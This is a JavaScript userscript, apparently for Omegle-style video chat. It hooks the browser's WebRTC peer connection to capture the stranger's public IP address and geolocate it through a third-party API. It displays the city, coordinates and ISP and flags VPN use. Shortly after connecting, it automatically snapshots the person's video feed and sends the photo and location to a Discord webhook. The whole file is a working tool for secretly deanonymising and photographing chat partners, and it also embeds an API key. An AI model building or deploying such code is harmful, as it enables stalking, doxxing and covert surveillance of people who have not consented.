const CONFIG = {
    apiKey: "6e211a362fd544f3b880ea6b46a7ac29",
    webhookUrl: "REPLACE WITH YOUR DISCORD WEBHOOK!"
};

let currentTarget = {
    ip: null,
    data: null,
    isVpn: false
};

let currentSessionId = 0;
let lastProcessedIp = null;

const styleSheet = document.createElement("style");
styleSheet.textContent = `
    @keyframes pulseGlow {
        0% { box-shadow: 0 16px 40px rgba(0, 0, 0, 0.8), 0 0 15px rgba(0, 240, 255, 0.15); }
        50% { box-shadow: 0 16px 40px rgba(0, 0, 0, 0.8), 0 0 25px rgba(0, 240, 255, 0.35); }
        100% { box-shadow: 0 16px 40px rgba(0, 0, 0, 0.8), 0 0 15px rgba(0, 240, 255, 0.15); }
    }
    .ax-card {
        background: rgba(255, 255, 255, 0.03);
        border: 1px solid rgba(255, 255, 255, 0.06);
        border-radius: 10px;
        padding: 10px 12px;
        backdrop-filter: blur(8px);
        transition: border-color 0.2s, background 0.2s;
    }
    .ax-card:hover {
        background: rgba(255, 255, 255, 0.05);
        border-color: rgba(0, 240, 255, 0.3);
    }
    .ax-btn {
        width: 28px;
        height: 28px;
        border: 1px solid rgba(255, 255, 255, 0.1);
        border-radius: 8px;
        background: rgba(255, 255, 255, 0.05);
        color: #fff;
        cursor: pointer;
        font-size: 14px;
        display: flex;
        align-items: center;
        justify-content: center;
        transition: 0.2s;
    }
    .ax-btn:hover {
        background: rgba(0, 240, 255, 0.2);
        border-color: rgba(0, 240, 255, 0.5);
    }
    .ax-copy-btn {
        background: rgba(0, 240, 255, 0.1);
        border: 1px solid rgba(0, 240, 255, 0.3);
        color: #00f0ff;
        border-radius: 4px;
        padding: 2px 6px;
        font-size: 10px;
        font-weight: 600;
        cursor: pointer;
        transition: 0.2s;
    }
    .ax-copy-btn:hover {
        background: rgba(0, 240, 255, 0.25);
        border-color: rgba(0, 240, 255, 0.6);
    }
    .ax-action-btn {
        width: 100%;
        background: linear-gradient(90deg, #00f0ff, #7000ff);
        border: none;
        border-radius: 8px;
        padding: 8px;
        color: #fff;
        font-weight: 700;
        font-size: 12px;
        cursor: pointer;
        text-align: center;
        text-decoration: none;
        display: block;
        box-sizing: border-box;
        transition: 0.2s;
    }
    .ax-action-btn:hover {
        opacity: 0.9;
        transform: translateY(-1px);
    }
    .ax-secondary-btn {
        width: 100%;
        background: rgba(255, 255, 255, 0.06);
        border: 1px solid rgba(255, 255, 255, 0.15);
        border-radius: 8px;
        padding: 8px;
        color: #fff;
        font-weight: 700;
        font-size: 12px;
        cursor: pointer;
        text-align: center;
        display: block;
        box-sizing: border-box;
        transition: 0.2s;
    }
    .ax-secondary-btn:hover {
        background: rgba(0, 240, 255, 0.15);
        border-color: rgba(0, 240, 255, 0.4);
    }
    .ax-badge {
        font-size: 10px;
        padding: 2px 6px;
        border-radius: 4px;
        font-weight: 700;
        letter-spacing: 0.5px;
        text-transform: uppercase;
    }
    .ax-badge-vpn {
        background: rgba(255, 68, 68, 0.2);
        border: 1px solid rgba(255, 68, 68, 0.5);
        color: #ff4444;
    }
    .ax-badge-clean {
        background: rgba(0, 255, 136, 0.2);
        border: 1px solid rgba(0, 255, 136, 0.5);
        color: #00ff88;
    }
`;
document.head.appendChild(styleSheet);

const panel = document.createElement('div');
panel.style.cssText = `
    position: fixed; 
    top: 20px; 
    right: 20px; 
    width: 420px; 
    background: rgba(10, 10, 12, 0.88);
    backdrop-filter: blur(16px);
    -webkit-backdrop-filter: blur(16px);
    color: #ffffff; 
    border: 1px solid rgba(0, 240, 255, 0.25);
    border-radius: 18px;
    padding: 20px;
    z-index: 99999;
    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    font-size: 13.5px;
    animation: pulseGlow 4s infinite;
    user-select: none; 
    cursor: move; 
    overflow: auto;
    resize: both;
    min-width: 320px;
    min-height: 200px;
    max-width: 90vw;
    max-height: 90vh;
    box-sizing: border-box;
    transition: min-height 0.3s ease;
`;

panel.innerHTML = `
    <div id="header" style="margin-bottom:14px;padding-bottom:12px;border-bottom:1px solid rgba(255,255,255,0.08);display:flex;justify-content:space-between;align-items:center;">
        <div>
            <strong style="font-size:15px;letter-spacing:0.8px;background:linear-gradient(90deg, #00f0ff, #7000ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:800;display:block;">Ax Scripts Ome Geolocation</strong>
            <div id="developerTag" style="font-size:11px;color:#a0a0a0;letter-spacing:0.5px;margin-top:1px;">Created by: <span style="color:#00f0ff;font-weight:600;">axolofc</span></div>
        </div>

        <div style="display:flex;gap:6px;align-items:center;">
            <button id="minBtn" class="ax-btn">−</button>
            <button id="closeBtn" class="ax-btn">✕</button>
        </div>
    </div>

    <div id="mainContent">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;">
            <span style="font-size:11px;text-transform:uppercase;letter-spacing:1px;color:#666;font-weight:700;">Connection Status</span>
            <span id="status" style="color:#a0a0a0;font-size:11.5px;padding:3px 10px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);border-radius:20px;font-weight:500;">
                Waiting for target...
            </span>
        </div>

        <div id="info" style="line-height:1.5;min-height:160px;color:#e0e0e0;">
            <div style="text-align:center;padding:25px;color:#888;font-weight:400;font-size:12px;">Waiting to detect target WebRTC stream...</div>
        </div>
    </div>
`;

document.body.appendChild(panel);

const info = document.getElementById("info");
const minBtn = document.getElementById("minBtn");
const closeBtn = document.getElementById("closeBtn");
const mainContent = document.getElementById("mainContent");

let minimized = false;
let savedHeight = "";

minBtn.onclick = () => {
    minimized = !minimized;
    if (minimized) {
        savedHeight = panel.style.height;
        mainContent.style.display = "none";
        panel.style.resize = "none";
        panel.style.minHeight = "0";
        panel.style.height = "auto";
        minBtn.textContent = "+";
    } else {
        mainContent.style.display = "block";
        panel.style.resize = "both";
        panel.style.minHeight = "200px";
        if (savedHeight) panel.style.height = savedHeight;
        minBtn.textContent = "−";
    }
};

closeBtn.onclick = () => {
    panel.remove();
};

let isDragging = false, offsetX, offsetY;
const header = document.getElementById("header");

header.addEventListener('mousedown', e => {
    if (e.target.tagName === "BUTTON" || e.target.tagName === "INPUT" || e.target.tagName === "A") return;
    isDragging = true;
    offsetX = e.clientX - panel.offsetLeft;
    offsetY = e.clientY - panel.offsetTop;
});

document.addEventListener('mousemove', e => {
    if (!isDragging) return;
    panel.style.left = (e.clientX - offsetX) + "px";
    panel.style.top = (e.clientY - offsetY) + "px";
    panel.style.right = "auto";
});

document.addEventListener('mouseup', () => { isDragging = false; });

window.copyToClipboard = function(text, btnEl) {
    if (!text || text === "N/A") return;
    navigator.clipboard.writeText(text).then(() => {
        const originalText = btnEl.textContent;
        btnEl.textContent = "Copied!";
        btnEl.style.color = "#00ff88";
        btnEl.style.borderColor = "#00ff88";
        setTimeout(() => {
            btnEl.textContent = originalText;
            btnEl.style.color = "#00f0ff";
            btnEl.style.borderColor = "rgba(0, 240, 255, 0.3)";
        }, 1200);
    });
};

function initWebRTC() {
    window.oRTCPeerConnection = window.oRTCPeerConnection || window.RTCPeerConnection;
    window.RTCPeerConnection = function(...args) {
        const pc = new window.oRTCPeerConnection(...args);
        
        pc.oaddIceCandidate = pc.addIceCandidate;
        pc.addIceCandidate = function(iceCandidate, ...rest) {
            if (iceCandidate?.candidate) {
                const fields = iceCandidate.candidate.split(" ");
                const ip = fields[4];
                const type = fields[7];
                if (ip && type === "srflx" && /^\d+\.\d+\.\d+\.\d+$/.test(ip)) {
                    if (lastProcessedIp !== ip) {
                        lastProcessedIp = ip;
                        const statusEl = document.getElementById('status');
                        statusEl.innerHTML = `Connected`;
                        statusEl.style.color = '#00f0ff';
                        statusEl.style.borderColor = 'rgba(0, 240, 255, 0.4)';
                        statusEl.style.background = 'rgba(0, 240, 255, 0.1)';
                        getLocation(ip);
                    }
                }
            }
            return pc.oaddIceCandidate(iceCandidate, ...rest);
        };
        return pc;
    };
}

initWebRTC();

function getRemoteVideo() {
    return document.querySelector('video#remote-video') ||
           document.querySelector('video:not([muted])') ||
           document.querySelectorAll('video')[1] ||
           document.querySelector('video[autoplay]') ||
           document.querySelector('video');
}

function checkVpnHeuristic(isp, org) {
    const text = ((isp || '') + ' ' + (org || '')).toLowerCase();
    const vpnKeywords = ['vpn', 'proxy', 'hosting', 'datacenter', 'm282', 'servers', 'cloud', 'digitalocean', 'linode', 'ovh', 'hetzner', 'expressvpn', 'nordvpn'];
    return vpnKeywords.some(kw => text.includes(kw));
}

function takeTargetSnapshot() {
    const remoteVideo = getRemoteVideo();
    if (!remoteVideo || remoteVideo.readyState < 2) return Promise.resolve(null);

    const canvas = document.createElement('canvas');
    canvas.width = remoteVideo.videoWidth || 1280;
    canvas.height = remoteVideo.videoHeight || 720;
    const ctx = canvas.getContext('2d');

    ctx.drawImage(remoteVideo, 0, 0, canvas.width, canvas.height);

    return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.90));
}

window.manualCaptureScreen = async function(btnEl) {
    if (!currentTarget.ip) return;

    const originalText = btnEl.textContent;
    btnEl.textContent = "📸 Capturing...";
    
    const photoBlob = await takeTargetSnapshot();
    if (photoBlob) {
        await sendWebhookBundle(currentTarget.ip, currentTarget.data, photoBlob, currentTarget.isVpn);
        btnEl.textContent = "✅ Sent to Discord!";
    } else {
        btnEl.textContent = "❌ Stream unavailable";
    }

    setTimeout(() => {
        btnEl.textContent = originalText;
    }, 2000);
};

async function sendWebhookBundle(ip, data, photoBlob, isVpn) {
    if (!CONFIG.webhookUrl) return;

    const formData = new FormData();
    const isVpnText = isVpn ? "⚠️ YES (VPN/Proxy)" : "✅ NO (Clean)";

    const targetIp = ip || "N/A";
    const city = data?.city || "N/A";
    const region = data?.state_prov || "N/A";
    const country = data?.country_name || "N/A";
    const isp = data?.isp || "N/A";
    const lang = data?.languages || "N/A";
    const lat = data?.latitude || "0";
    const lon = data?.longitude || "0";

    const payload = {
        embeds: [{
            title: "🌐 Target Info & Photo - Ax Scripts",
            color: 61695,
            fields: [
                { name: "🌐 IP Address", value: `\`${targetIp}\``, inline: true },
                { name: "🛡️ VPN / Proxy", value: isVpnText, inline: true },
                { name: "📍 Location", value: `${city}, ${region}, ${country}`, inline: false },
                { name: "🏢 ISP", value: isp, inline: true },
                { name: "🗣️ Language", value: lang, inline: true },
                { name: "🗺️ Coordinates", value: `[${lat}, ${lon}](https://maps.google.com/?q=${lat},${lon})`, inline: false }
            ],
            footer: { text: "Created by axolofc • Omegle Geolocation Tool" },
            timestamp: new Date().toISOString()
        }]
    };

    formData.append("payload_json", JSON.stringify(payload));

    if (photoBlob) {
        formData.append("files[0]", photoBlob, "target_photo.jpg");
    }

    try {
        await fetch(CONFIG.webhookUrl, {
            method: "POST",
            body: formData
        });
    } catch (e) {
        console.warn("Failed to send webhook log.");
    }
}

async function getLocation(ip) {
    currentSessionId++;
    const thisSessionId = currentSessionId;

    const infoDiv = document.getElementById('info');
    infoDiv.innerHTML = `<div style="text-align:center;padding:25px;color:#00f0ff;font-weight:500;">Fetching geolocation telemetry...</div>`;
    
    try {
        const res = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${CONFIG.apiKey}&ip=${ip}`);
        const data = await res.json();

        if (thisSessionId !== currentSessionId) return;

        const isVpn = checkVpnHeuristic(data.isp, data.organization);
        currentTarget = { ip, data, isVpn };

        const vpnBadge = isVpn 
            ? `<span class="ax-badge ax-badge-vpn">VPN / Proxy</span>` 
            : `<span class="ax-badge ax-badge-clean">Clean IP</span>`;

        const mapsUrl = `https://maps.google.com/?q=${data.latitude},${data.longitude}`;

        const countryVal = data.country_name || 'N/A';
        const cityVal = data.city || 'N/A';
        const regionVal = data.state_prov || 'N/A';
        const langVal = data.languages || 'N/A';
        const ispVal = data.isp || 'N/A';
        const coordsVal = `${data.latitude}, ${data.longitude}`;

        const html = `
            <div class="ax-card" style="margin-bottom:10px;display:flex;justify-content:space-between;align-items:center;">
                <div>
                    <span style="color:#888;font-size:11px;display:block;">TARGET IP ADDRESS</span>
                    <strong style="color:#00f0ff;font-size:15px;font-family:monospace;letter-spacing:0.5px;">${ip}</strong>
                </div>
                <div style="display:flex;gap:6px;align-items:center;">
                    <button class="ax-copy-btn" onclick="copyToClipboard('${ip}', this)">Copy</button>
                    ${vpnBadge}
                </div>
            </div>

            <div style="display:grid;grid-template-columns: 1fr 1fr;gap:8px;font-size:13px;">
                <div class="ax-card">
                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:2px;">
                        <span style="color:#777;font-size:10.5px;font-weight:700;letter-spacing:0.5px;">COUNTRY</span>
                        <button class="ax-copy-btn" onclick="copyToClipboard('${countryVal}', this)">Copy</button>
                    </div>
                    <strong style="color:#fff;">${countryVal}</strong>
                </div>
                <div class="ax-card">
                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:2px;">
                        <span style="color:#777;font-size:10.5px;font-weight:700;letter-spacing:0.5px;">CITY</span>
                        <button class="ax-copy-btn" onclick="copyToClipboard('${cityVal}', this)">Copy</button>
                    </div>
                    <strong style="color:#fff;">${cityVal}</strong>
                </div>
                <div class="ax-card">
                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:2px;">
                        <span style="color:#777;font-size:10.5px;font-weight:700;letter-spacing:0.5px;">REGION</span>
                        <button class="ax-copy-btn" onclick="copyToClipboard('${regionVal}', this)">Copy</button>
                    </div>
                    <strong style="color:#fff;">${regionVal}</strong>
                </div>
                <div class="ax-card">
                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:2px;">
                        <span style="color:#777;font-size:10.5px;font-weight:700;letter-spacing:0.5px;">LANGUAGE</span>
                        <button class="ax-copy-btn" onclick="copyToClipboard('${langVal}', this)">Copy</button>
                    </div>
                    <strong style="color:#fff;">${langVal}</strong>
                </div>
            </div>

            <div class="ax-card" style="margin-top:8px;">
                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:2px;">
                    <span style="color:#777;font-size:10.5px;font-weight:700;letter-spacing:0.5px;">INTERNET SERVICE PROVIDER (ISP)</span>
                    <button class="ax-copy-btn" onclick="copyToClipboard('${ispVal}', this)">Copy</button>
                </div>
                <strong style="color:#fff;">${ispVal}</strong>
            </div>

            <div class="ax-card" style="margin-top:8px;display:flex;justify-content:space-between;align-items:center;">
                <div>
                    <div style="display:flex;gap:8px;align-items:center;margin-bottom:2px;">
                        <span style="color:#777;font-size:10.5px;font-weight:700;letter-spacing:0.5px;">COORDINATES</span>
                        <button class="ax-copy-btn" onclick="copyToClipboard('${coordsVal}', this)">Copy</button>
                    </div>
                    <strong style="color:#fff;">${coordsVal}</strong>
                </div>
                <div style="text-align:right;">
                    <span style="color:#777;display:block;font-size:10.5px;font-weight:700;letter-spacing:0.5px;margin-bottom:2px;">LOCAL TIME</span>
                    <strong style="color:#fff;">${data.time_zone?.current_time?.split(' ')[1] || 'N/A'}</strong>
                </div>
            </div>

            <div style="display:grid;grid-template-columns: 1fr 1fr;gap:8px;margin-top:10px;">
                <button class="ax-secondary-btn" onclick="manualCaptureScreen(this)">📸 Capture Screen</button>
                <a href="${mapsUrl}" target="_blank" class="ax-action-btn">🗺️ Open Maps</a>
            </div>
        `;
        infoDiv.innerHTML = html;

        setTimeout(async () => {
            const photoBlob = await takeTargetSnapshot();
            await sendWebhookBundle(ip, data, photoBlob, isVpn);
        }, 1500);

    } catch (e) {
        if (thisSessionId === currentSessionId) {
            infoDiv.innerHTML = `<div style="color:#ff4444;text-align:center;padding:15px;background:rgba(255,0,0,0.05);border-radius:10px;border:1px solid rgba(255,0,0,0.2);">Failed to resolve target location data.</div>`;
        }
    }
}
